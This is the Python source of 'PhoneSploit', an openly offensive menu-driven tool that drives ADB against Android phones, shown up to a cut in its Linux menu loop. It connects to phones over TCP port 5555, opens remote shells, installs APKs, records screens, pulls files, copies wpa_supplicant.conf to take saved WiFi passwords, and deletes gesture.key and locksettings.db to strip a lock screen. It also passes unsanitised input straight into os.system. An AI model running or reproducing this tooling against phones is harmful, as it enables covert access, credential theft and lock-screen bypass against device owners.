
#Imports

import os
import random
import time as t
from colorama import Fore, init
import sys

#=============================
# Variables
CurrentDir = os.path.dirname(os.path.abspath(__file__))
load_count = 0

#=============================
#Install Functions
'''def ColoringModeStartup():
    coloring_file = open(CurrentDir+"\\install\\coloring.txt", "a+")
    line = open(CurrentDir+"\\install\\coloring.txt", "a+").readline()
    if 'true' in line:
     init(convert=True)
     main()
    if 'false' in line:
     windows=False
     main()
    if "NOT_LOADED" in line:
     platform_choice = input("Are you loading this script in (W)indows or (L)inux: ")
     open(CurrentDir+"\\install\\coloring.txt", "w").close()
     if platform_choice.lower() == 'w':
         coloring_file.write("true")
     else:
         coloring_file.write("false")
         yn = input(Fore.WHITE + "Have you already installed adb via command line "+Fore.GREEN + "Y"+Fore.WHITE+"/"+Fore.RED+"N "+Fore.WHITE)
         if yn == "n":
             os.system("sudo apt install adb")
         else:
             main()'''

#=============================

arrow = Fore.RED + " ->" + Fore.WHITE
connect = Fore.RED + "|" + Fore.WHITE
page2 = False

logo_design_1 = ('''
  {0}  ____  __                    _____       __      _ __ 
   / __ \/ /_  ____  ____  ___ / ___/____  / /___  (_) /_
  / /_/ / __ \/ __ \/ __ \/ _ \\__ \/ __ \ / / __ \/ / __/
{1} / ____/ / / / /_/ / / / /  __/__/ / /_/ / / /_/ / / /_  
/_/   /_/ /_/\____/_/ /_/\___/____/ .___/_/\____/_/\__/  
                                 /_/''').format(Fore.GREEN, Fore.WHITE, Fore.RED)

logo_design_2 = Fore.GREEN + '''                                             
  .;'                     `;,
 .;'  ,;'             `;,  `;,   {0}PhoneSploit
.;'  ,;'  ,;'     `;,  `;,  `;,
::   ::   :   {1}( ){0}   :   ::   ::                              
':.  ':.  ':. {1}/_\{0} ,:'  ,:'  ,:'          
 ':.  ':.    {1}/___\{0}    ,:'  ,:'     {1}by R(0_o)T{0}
  ':.       {1}/_____\{0}      ,:'
           {1}/       \\{0}
'''.format(Fore.GREEN, Fore.WHITE, Fore.RED)

logo_design_pre = '''
{0}╔═╗{1}┬ ┬┌─┐┌┐┌┌─┐{0}╔═╗{1}┌─┐┬  ┌─┐┬┌┬┐
{0}╠═╝{1}├─┤│ ││││├┤ {0}╚═╗{1}├─┘│  │ ││ │ 
{0}╩  {1}┴ ┴└─┘┘└┘└─┘{0}╚═╝{1}┴  ┴─┘└─┘┴ ┴ '''.format(Fore.GREEN, Fore.WHITE, Fore.RED)
logo_design_3 = logo_design_pre

logo_design_4 = '''
\033[92m
          +hydNNNNdyh+
        +mMMMMMMMMMMMMm+
      `dMMm\033[0m:\033[92mNMMMMMMN\033[0m:\033[92mmMMd`
      hMMMMMMMMMMMMMMMMMMh
  \033[92m..  yyyyyyyyyyyyyyyyyyyy  ..                                     
\033[92m.mMMm`MMMMMMMMMMMMMMMMMMMM`mMMm.            \033[0m Thanks for downloading!\033[92m
\033[92m:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
:MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM:
-MMMM-MMMMMMMMMMMMMMMMMMMM-MMMM-
 +yy+ MMMMMMMMMMMMMMMMMMMM +yy+
      mMMMMMMMMMMMMMMMMMMm
      `/++MMMMh++hMMMM++/`
          MMMMo  oMMMM
          MMMMo  oMMMM
          oNMm-  -mMNs'''

logo_design_5 = '''
 {0}______   {1}__  __     ______     __   __     ______     {0}______     {1}______   __         ______     __     ______  
{0}/\  == \ {1}/\ \_\ \   /\  __ \   /\ "-.\ \   /\  ___\   {0}/\  ___\   {1}/\  == \ /\ \       /\  __ \   /\ \   /\__  _\ 
{0}\ \  _-/ {1}\ \  __ \  \ \ \/\ \  \ \ \-.  \  \ \  __\   {0}\ \___  \  {1}\ \  _-/ \ \ \____  \ \ \/\ \  \ \ \  \/_/\ \/ 
 {0}\ \_\    {1}\ \_\ \_\  \ \_____\  \ \_\\"\_\   \ \_____\  {0}\/\_____\  {1}\ \_\    \ \_____\  \ \_____\  \ \_\    \ \_\ 
  {0}\/_/     {1}\/_/\/_/   \/_____/   \/_/ \/_/   \/_____/   {0}\/_____/   {1}\/_/     \/_____/   \/_____/   \/_/     \/_/
'''.format(Fore.WHITE, Fore.GREEN)

logo_design_6 = Fore.RED + '''
                      ,____
                      |---.\\
              ___     |    `      PHONESPLOIT
             / .-\  ./=)
            |  |"|_/\/|
            ;  |-;| /_|         REAP THE REWARDS
           / \_| |/ \ |
          /      \/\( |
          |   /  |` ) |
          /   \ _/    |
         /--._/  \    |
         `/|)    |    /
           /     |   |
         .'      |   |
        /         \  |
       (_.-.__.__./  /

'''

logo_design_7 = Fore.GREEN + '''
    .o oOOOOOOOo                                            OOOo
    Ob.OOOOOOOo  OOOo.      oOOo.                      .adOOOOOOO
    OboO"""""""""""".OOo. .oOOOOOo.    OOOo.oOOOOOo.."""""""""'OO
    OOP.oOOOOOOOOOOO "POOOOOOOOOOOo.   `"OOOOOOOOOP,OOOOOOOOOOOB'
    `O'OOOO'     `OOOOo"OOOOOOOOOOO` .adOOOOOOOOO"oOOO'    `OOOOo
    .OOOO'            `OOOOOOOOOOOOOOOOOOOOOOOOOO'            `OO
    OOOOO                 '"OOOOOOOOOOOOOOOO"`                oOO
   oOOOOOba.                .adOOOOOOOOOOba               .adOOOOo.
  oOOOOOOOOOOOOOba.    .adOOOOOOOOOO@^OOOOOOOba.     .adOOOOOOOOOOOO
 OOOOOOOOOOOOOOOOO.OOOOOOOOOOOOOO"`  '"OOOOOOOOOOOOO.OOOOOOOOOOOOOO
 "OOOO"       "YOoOOOOMOIONODOO"`  .   '"OOROAOPOEOOOoOY"     "OOO"
    Y           'OOOOOOOOOOOOOO: .oOOo. :OOOOOOOOOOO?'         :`
    :            .oO%OOOOOOOOOOo.OOOOOO.oOOOOOOOOOOOO?         .
    .            oOOP"%OOOOOOOOoOOOOOOO?oOOOOO?OOOO"OOo
                 '%o  OOOO"%OOOO%"%OOOOO"OOOOOO"OOO':
                      `$"  `OOOO' `O"Y ' `OOOO'  o             .
    .                  .     OP"          : o     .

'''

logo_design_8 = '''
   ▄▄▄· ▄ .▄       ▐ ▄ ▄▄▄ ..▄▄ ·  ▄▄▄·▄▄▌        ▪  ▄▄▄▄▄
  ▐█ ▄███▪▐█▪     •█▌▐█▀▄.▀·▐█ ▀. ▐█ ▄███•  ▪     ██ •██  
   ██▀·██▀▐█ ▄█▀▄ ▐█▐▐▌▐▀▀▪▄▄▀▀▀█▄ ██▀·██▪   ▄█▀▄ ▐█· ▐█.▪
  ▐█▪·•██▌▐▀▐█▌.▐▌██▐█▌▐█▄▄▌▐█▄▪▐█▐█▪·•▐█▌▐▌▐█▌.▐▌▐█▌ ▐█▌·
  .▀   ▀▀▀ · ▀█▄▀▪▀▀ █▪ ▀▀▀  ▀▀▀▀ .▀   .▀▀▀  ▀█▄▀▪▀▀▀ ▀▀▀ 
'''

# Graphics # http://patorjk.com/software/taag/#p=display&f=Graffiti&t=Type%20Something%20

page_1 = '''\n
{0}[{1}1{0}] {2}Show Connected Devices      {0}[{1}6{0}] {2}Screen record a phone               {0}[{1}11{0}] {2}Uninstall an app                   
{0}[{1}2{0}] {2}Disconect all devices       {0}[{1}7{0}] {2}Screen Shot a picture on a phone    {0}[{1}12{0}] {2}Show real time log of device       
{0}[{1}3{0}] {2}Connect a new phone         {0}[{1}8{0}] {2}Restart Server                      {0}[{1}13{0}] {2}Dump System Info                   
{0}[{1}4{0}] {2}Access Shell on a phone     {0}[{1}9{0}] {2}Pull folders from phone to pc       {0}[{1}14{0}] {2}List all apps on a phone           
{0}[{1}5{0}] {2}Install an apk on a phone   {0}[{1}10{0}] {2}Turn The Device off                {0}[{1}15{0}] {2}Run an app                         


{0}[{1}99{0}] {2}Exit   {0}[{1}0{0}] {2}Clear   {0}[{1}p{0}] Next Page                           
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN)

page_2 = '''\n
{0}[{1}16{0}]{2} Port Forwarding                {0}[{1}21{0}]{2} NetStat 
{0}[{1}17{0}]{2} Grab wpa_supplicant            {0}[{1}22{0}]{2} Turn WiFi On/Off                 
{0}[{1}18{0}]{2} Show Mac/Inet                  {0}[{1}23{0}]{2} Remove Password
{0}[{1}19{0}]{2} Extract apk from app           {0}[{1}24{0}]{2} Use Keycode            
{0}[{1}20{0}]{2} Get Battery Status             {0}[{1}25{0}]{2} Get Current Activity                  


{0}[{1}99{0}] {2}Exit   {0}[{1}0{0}] {2}Clear   {0}[{1}b{0}] Back to page one
'''.format(Fore.CYAN, Fore.RED, Fore.GREEN)

#to get operating system
def get_platform():
    platforms = {
        'linux1' : 'Linux',
        'linux2' : 'Linux',
        'darwin' : 'OS X',
        'win32' : 'Windows'
    }

#=============================
#Main
def main():
    page_num = 1
    option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")
    if option == '1':
        os.system("adb devices -l")
    elif option  ==  '2':
        os.system("adb disconnect")
    elif option == '3':
        os.system("adb tcpip 5555")
        print (("\n[{0}+{1}] Enter a phones ip address.").format(Fore.RED, Fore.WHITE))
        ip = input(arrow+" phonesploit"+Fore.RED + "(connect_phone) "+Fore.WHITE + "> ")
        os.system("adb connect "+ip+":5555")
    
    elif option  == '4':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(shell_on_phone) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" shell")

    elif option == '5':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(apk_install) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}]Enter the apk location.").format(Fore.RED, Fore.WHITE))
        apk_location = input("    "+arrow + "phonesploit"+Fore.RED + "(apk_install) "+Fore.WHITE + "> ")
        os.system("adb -s  "+device_name+" install "+apk_location)
        print (Fore.GREEN  +  "Apk has been installed.")

    elif option ==  '6':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(screen_record) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}] Please wait 3m its recording").format(Fore.RED, Fore.WHITE))
        print (("     "+connect))
        os.system("adb -s "+device_name+" shell screenrecord /sdcard/demo.mp4")
        print (("    [{0}+{1}]Enter where you would like the video to be saved.").format(Fore.RED, Fore.WHITE))
        place_location = input("    "+arrow + "phonesploit"+Fore.RED + "(screen_record) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" pull /sdcard/demo.mp4 "+place_location)

    elif option  == '7':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(screenshot) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
        print (("     "+connect))
        print (("    [{0}+{1}]Enter where you would like the screenshot to be saved.").format(Fore.RED, Fore.WHITE))
        place_location = input("    "+arrow + "phonesploit"+Fore.RED + "(screenshot) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)

    elif option == '8':
        os.system("adb kill-server && adb start-server")
    
    elif option == '9':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}]Enter a file location on a device").format(Fore.RED, Fore.WHITE))
        file_location = input("    "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
        print (("        "+connect))
        print (("       [{0}+{1}]Enter where you would like the file to be saved.").format(Fore.RED, Fore.WHITE))
        place_location = input("       "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)

    elif option == '10':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(device_reboot) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+ " reboot ")
    
    elif option ==  '11':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(app_delete) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}]Enter a package name.").format(Fore.RED, Fore.WHITE))
        package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(app_delete) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" unistall "+package_name)

    elif option == '12':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(log) "+Fore.WHITE + "> ")
        os.system('adb -s '+device_name+" logcat ")

    elif option == '13':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(sys_info) "+Fore.WHITE + "> ")
        os.system("adb shell "+device_name+" dumpsys")        

    elif option == '14':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(package_manager) "+Fore.WHITE + "> ")
        os.system("adb -s " +device_name+ " shell pm list packages -f")
        main()

    elif option == '15':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(app_run) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE))
        package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(app_run) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
        main()      

    elif option == '16':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}]Enter a port on the device.").format(Fore.RED, Fore.WHITE))
        port_device = input("    "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
        print (("         "+connect))
        print (("        [{0}+{1}]Enter a port to forward it too.").format(Fore.RED, Fore.WHITE))
        forward_port = input("        "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port) 

    elif option == '17':
        try:
            print (("[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
            device_name = input(arrow + "phonesploit"+Fore.RED + "(wpa_grab) "+Fore.WHITE + "> ")
            print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C").format(Fore.RED, Fore.WHITE))
            print (("     "+connect))
            print (("    [{0}+{1}]Enter where you want the file to be saved.").format(Fore.RED, Fore.WHITE))
            location = input("    "+arrow + "phonesploit"+Fore.RED + "(wpa_grab) "+Fore.WHITE + "> ")      
            os.system("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
            os.system("adb -s "+device_name+" pull /sdcard/wpa_supplicant.conf "+location)
        except KeyboardInterrupt:
            main()    

    elif option == '18':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(mac_inet) "+Fore.WHITE + "> ")
        os.system("adb -s " +device_name+ " shell ip address show wlan0")
        main()

    elif option == '19':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE))
        package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" shell pm path "+package_name)
        print (("         "+connect))
        print (("        [{0}+{1}]Enter the path. It's looks like this /data/app/com.snapchat.android-qWgDcBiCEvANq6op_NPqeA==/base.apk").format(Fore.RED, Fore.WHITE))
        path = input("        "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
        print (("             "+connect))
        print (("            [{0}+{1}]Enter The location to store the apk: ")  .format(Fore.RED, Fore.WHITE))
        location =   input("            "+arrow + "phonesploit"+Fore.RED + "(pull_apk) "+Fore.WHITE + "> ")
        os.system("adb -s " +device_name+" pull "+path+" "+location)
        main()

    elif option == '20':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(battery) "+Fore.WHITE + "> ")
        os.system("adb -s " +device_name+ " shell dumpsys battery")
        main()

    elif option == '21':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(net_stat) "+Fore.WHITE + "> ")
        os.system("adb -s " +device_name+ " shell netstat")
        main()

    elif option == '22':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(wifi) "+Fore.WHITE + "> ")
        print (("     "+connect))
        print (("    [{0}+{1}] To turn wifi back on you need the device to be pluged in.").format(Fore.RED, Fore.WHITE))
        print (("     "+connect))
        on_off = input(Fore.WHITE + "    ["+Fore.RED+"+"+Fore.WHITE+"]Would you like the wifi "+Fore.GREEN +"on"+Fore.WHITE +"/"+Fore.RED +"off "+Fore.WHITE)
        if on_off == 'off':
            command = " shell svc wifi disable"
        else:
            command = " shell svc wifi enable"
            
        os.system("adb -s "+device_name+command)

    elif option == '23':
        print (("[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(pass_remove) "+Fore.WHITE + "> ")
        print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C THIS IS ALSO UNTESTED").format(Fore.RED, Fore.WHITE))
        print (("     "+connect))
        print (Fore.RED + "******************TRYING TO REMOVE PASS******************")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/gesture.key'")
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db'") 
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-wal'") 
        os.system("adb -s "+device_name+" shell su 0 'rm /data/system/locksettings.db-shm'")
        print (Fore.RED + "******************TRYING TO REMOVE PASS******************")  
        
    elif option == '24':
        print (("[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(keycode) "+Fore.WHITE + "> ")
        print ('''
0 -->  "KEYCODE_UNKNOWN" 
1 -->  "KEYCODE_MENU" 
2 -->  "KEYCODE_SOFT_RIGHT" 
3 -->  "KEYCODE_HOME" 
4 -->  "KEYCODE_BACK" 
5 -->  "KEYCODE_CALL" 
6 -->  "KEYCODE_ENDCALL" 
7 -->  "KEYCODE_0" 
8 -->  "KEYCODE_1" 
9 -->  "KEYCODE_2" 
10 -->  "KEYCODE_3" 
11 -->  "KEYCODE_4" 
12 -->  "KEYCODE_5" 
13 -->  "KEYCODE_6" 
14 -->  "KEYCODE_7" 
15 -->  "KEYCODE_8" 
16 -->  "KEYCODE_9" 
17 -->  "KEYCODE_STAR" 
18 -->  "KEYCODE_POUND" 
19 -->  "KEYCODE_DPAD_UP" 
20 -->  "KEYCODE_DPAD_DOWN" 
21 -->  "KEYCODE_DPAD_LEFT" 
22 -->  "KEYCODE_DPAD_RIGHT" 
23 -->  "KEYCODE_DPAD_CENTER" 
24 -->  "KEYCODE_VOLUME_UP" 
25 -->  "KEYCODE_VOLUME_DOWN" 
26 -->  "KEYCODE_POWER" 
27 -->  "KEYCODE_CAMERA" 
28 -->  "KEYCODE_CLEAR" 
29 -->  "KEYCODE_A" 
30 -->  "KEYCODE_B" 
31 -->  "KEYCODE_C" 
32 -->  "KEYCODE_D" 
33 -->  "KEYCODE_E" 
34 -->  "KEYCODE_F" 
35 -->  "KEYCODE_G" 
36 -->  "KEYCODE_H" 
37 -->  "KEYCODE_I" 
38 -->  "KEYCODE_J" 
39 -->  "KEYCODE_K" 
40 -->  "KEYCODE_L" 
41 -->  "KEYCODE_M" 
42 -->  "KEYCODE_N" 
43 -->  "KEYCODE_O" 
44 -->  "KEYCODE_P" 
45 -->  "KEYCODE_Q" 
46 -->  "KEYCODE_R" 
47 -->  "KEYCODE_S" 
48 -->  "KEYCODE_T" 
49 -->  "KEYCODE_U" 
50 -->  "KEYCODE_V" 
51 -->  "KEYCODE_W" 
52 -->  "KEYCODE_X" 
53 -->  "KEYCODE_Y" 
54 -->  "KEYCODE_Z" 
55 -->  "KEYCODE_COMMA" 
56 -->  "KEYCODE_PERIOD" 
57 -->  "KEYCODE_ALT_LEFT" 
58 -->  "KEYCODE_ALT_RIGHT" 
59 -->  "KEYCODE_SHIFT_LEFT" 
60 -->  "KEYCODE_SHIFT_RIGHT" 
61 -->  "KEYCODE_TAB" 
62 -->  "KEYCODE_SPACE" 
63 -->  "KEYCODE_SYM" 
64 -->  "KEYCODE_EXPLORER" 
65 -->  "KEYCODE_ENVELOPE" 
66 -->  "KEYCODE_ENTER" 
67 -->  "KEYCODE_DEL" 
68 -->  "KEYCODE_GRAVE" 
69 -->  "KEYCODE_MINUS" 
70 -->  "KEYCODE_EQUALS" 
71 -->  "KEYCODE_LEFT_BRACKET" 
72 -->  "KEYCODE_RIGHT_BRACKET" 
73 -->  "KEYCODE_BACKSLASH" 
74 -->  "KEYCODE_SEMICOLON" 
75 -->  "KEYCODE_APOSTROPHE" 
76 -->  "KEYCODE_SLASH" 
77 -->  "KEYCODE_AT" 
78 -->  "KEYCODE_NUM" 
79 -->  "KEYCODE_HEADSETHOOK" 
80 -->  "KEYCODE_FOCUS" 
81 -->  "KEYCODE_PLUS" 
82 -->  "KEYCODE_MENU" 
83 -->  "KEYCODE_NOTIFICATION" 
84 -->  "KEYCODE_SEARCH" 
85 -->  "TAG_LAST_KEYCODE"        
        ''')
        print (("[{0}+{1}]Enter a number.").format(Fore.RED, Fore.WHITE))
        num = input(arrow + "phonesploit"+Fore.RED + "(keycode) "+Fore.WHITE + "> ")
        os.system("adb -s "+device_name+" shell input keyevent "+num)

    elif option == '25':
        print (("\n[{0}+{1}]Enter a device name.").format(Fore.RED, Fore.WHITE))
        device_name = input(arrow + "phonesploit"+Fore.RED + "(current_activity) "+Fore.WHITE + "> ")
        os.system("adb -s " +device_name+ " dumpsys activity")
        main()
        
    elif option == '0':
        global page2
        if page2 is True:
            cls(page_2)
        else:
            cls(page_1)

    elif option == 'p':
        os.system('cls')
        page2 = True
        banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_8])
        print (Fore.RED + banner_title)
        print (page_2)  

    elif option == 'b':
        os.system('cls')
        page2 = False
        banner_title = random.choice([logo_design_1,logo_design_2,logo_design_3,logo_design_4,logo_design_5,logo_design_6,logo_design_7,logo_design_8])
        print (Fore.RED + banner_title)
        print (page_1)  

    elif option == '99':
        sys.exit()

def main_linux():

    page_num = 1
    os.system("adb tcpip 5555")
    os.system("adb devices -l")
    print (("\n[{0}+{1}] Enter a phones ip address.(Type 99 to exit)").format(Fore.RED, Fore.WHITE))
    try:
        device_name = input (arrow+" phonesploit"+Fore.RED + "(connect_phone) "+Fore.WHITE + "> ")
    except KeyboardInterrupt:
        main()
    if device_name == '':
        main()
    if device_name == '99':
        sys.exit()
    os.system("adb connect "+device_name+":5555")
    option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

    while(1):
        if option == '1':
            os.system("adb devices -l")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option  ==  '2':
            os.system("adb disconnect")
            main()

        elif option == '3':
            main()

        elif option  == '4':
            os.system("adb -s "+device_name+" shell")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '5':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter the apk location.").format(Fore.RED, Fore.WHITE))
            apk_location = input("    "+arrow + "phonesploit"+Fore.RED + "(apk_install) "+Fore.WHITE + "> ")
            os.system("adb -s  "+device_name+" install "+apk_location)
            print (Fore.GREEN  +  "Apk has been installed.")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option ==  '6':
            print (("     "+connect))
            print (("    [{0}+{1}] Please wait 3m its recording").format(Fore.RED, Fore.WHITE))
            print (("     "+connect))
            os.system("adb -s "+device_name+" shell screenrecord /sdcard/demo.mp4")
            print (("    [{0}+{1}]Enter where you would like the video to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
            place_location = input("    "+arrow + "phonesploit"+Fore.RED + "(screen_record) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" pull /sdcard/demo.mp4 "+place_location)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option  == '7':
            os.system("adb -s "+device_name+" shell screencap /sdcard/screen.png")
            print (("     "+connect))
            print (("    [{0}+{1}]Enter where you would like the screenshot to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
            place_location = input("    "+arrow + "phonesploit"+Fore.RED + "(screenshot) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" pull /sdcard/screen.png "+place_location)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '8':
            os.system("adb kill-server && adb start-server")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '9':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a file location on a device").format(Fore.RED, Fore.WHITE))
            file_location = input("    "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
            print (("        "+connect))
            print (("       [{0}+{1}]Enter where you would like the file to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
            place_location = input("       "+arrow + "phonesploit"+Fore.RED + "(file_pull) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" pull "+file_location+" "+place_location)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '10':
            os.system("adb -s "+device_name+ " reboot ")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option ==  '11':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a package name.").format(Fore.RED, Fore.WHITE))
            package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(app_delete) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" unistall "+package_name)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '12':
            os.system('adb -s '+device_name+" logcat ")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '13':
            os.system("adb  -s "+device_name+" dumpsys")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '14':
            os.system("adb -s " +device_name+ " shell pm list packages -f")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '15':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a package name. They look like this --> com.snapchat.android").format(Fore.RED, Fore.WHITE))
            package_name = input("    "+arrow + "phonesploit"+Fore.RED + "(app_run) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" shell monkey -p "+package_name+" -v 500")
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '16':
            print (("     "+connect))
            print (("    [{0}+{1}]Enter a port on the device.").format(Fore.RED, Fore.WHITE))
            port_device = input("    "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
            print (("         "+connect))
            print (("        [{0}+{1}]Enter a port to forward it too.").format(Fore.RED, Fore.WHITE))
            forward_port = input("        "+arrow + "phonesploit"+Fore.RED + "(port_forward) "+Fore.WHITE + "> ")
            os.system("adb -s "+device_name+" forward tcp:"+port_device+" tcp:"+forward_port)
            option = input(Fore.WHITE + "phonesploit"+Fore.RED + "(main_menu) "+Fore.WHITE + "> ")

        elif option == '17':
            try:
                print ((Fore.WHITE + "    [{0}+{1}]{1}THE DEVICE NEEDS TO BE ROOTED TO CONTINUE TO EXIT USE CTRL +C").format(Fore.RED, Fore.WHITE))
                print (("     "+connect))
                print (("    [{0}+{1}]Enter where you want the file to be saved.[Default: present working directory]").format(Fore.RED, Fore.WHITE))
                location = input("    "+arrow + "phonesploit"+Fore.RED + "(wpa_grab) "+Fore.WHITE + "> ")
                os.system("adb -s "+device_name+" shell "+"su -c 'cp /data/misc/wifi/wpa_supplicant.conf /sdcard/'")
                os.system("adb -s "+device_name+" pull /sdcard/wpa_supplicant.conf "+location)
